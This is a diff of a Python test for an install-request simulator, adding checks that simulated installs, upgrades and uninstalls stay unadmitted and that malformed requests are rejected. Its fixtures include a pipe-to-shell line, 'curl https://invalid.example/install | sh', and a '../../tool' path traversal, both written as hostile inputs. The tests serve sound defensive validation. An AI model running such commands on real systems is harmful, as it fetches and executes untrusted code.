@@ -119,6 +119,13 @@ def main() -> int:
     assert simulation["status"] == "not-admitted"
     assert simulation["events"][-1]["code"] == "REAL_INSTALL_NOT_ADMITTED"
     assert all(value is False for value in simulation["effects"].values())
+    assert simulation["operation"] == "plan-install"
+    assert simulation["missingPromotionEvidence"] == [
+        "platformLifecycleEvidenceAvailable",
+        "signatureOrAttestationAvailable",
+    ]
+    assert simulation["scenarioEvidenceAcceptedAsAuthority"] is False
+    assert simulation["approvalAccepted"] is False
     hostile = dict(request, command="curl https://invalid.example/install | sh")
     expect_error("invalid-install-request-shape", READINESS.simulate_install_request, hostile, registry)
     hostile = dict(request, componentId="../../tool")
@@ -129,7 +136,27 @@ def main() -> int:
     expect_error("invalid-install-request-shape", READINESS.simulate_install_request, hostile, registry)
     hostile = dict(request, packageSha256="0" * 64)
     expect_error("invalid-install-request-shape", READINESS.simulate_install_request, hostile, registry)
-    checks += 8
+    hostile = dict(request, operation="execute-install")
+    expect_error("invalid-install-operation", READINESS.simulate_install_request, hostile, registry)
+    hostile = dict(request, currentState="unknown")
+    expect_error("unknown-component-state", READINESS.simulate_install_request, hostile, registry)
+    hostile = dict(request, currentState="present")
+    expect_error("install-requires-absent-state", READINESS.simulate_install_request, hostile, registry)
+    hostile = dict(request, operation="plan-upgrade")
+    expect_error("lifecycle-operation-requires-present-state", READINESS.simulate_install_request, hostile, registry)
+    hostile = json.loads(json.dumps(request))
+    hostile["promotionEvidence"]["checksumAvailable"] = "true"
+    expect_error("invalid-promotion-evidence", READINESS.simulate_install_request, hostile, registry)
+    hostile = json.loads(json.dumps(request))
+    hostile["promotionEvidence"]["packagePath"] = "untrusted"
+    expect_error("invalid-promotion-evidence", READINESS.simulate_install_request, hostile, registry)
+    upgrade = json.loads(json.dumps(request))
+    upgrade.update(operation="plan-upgrade", currentState="present")
+    assert READINESS.simulate_install_request(upgrade, registry)["status"] == "not-admitted"
+    uninstall = json.loads(json.dumps(request))
+    uninstall.update(operation="plan-uninstall", currentState="present")
+    assert READINESS.simulate_install_request(uninstall, registry)["status"] == "not-admitted"
+    checks += 20
 
     with tempfile.TemporaryDirectory() as directory:
         path = Path(directory) / "registry.json"
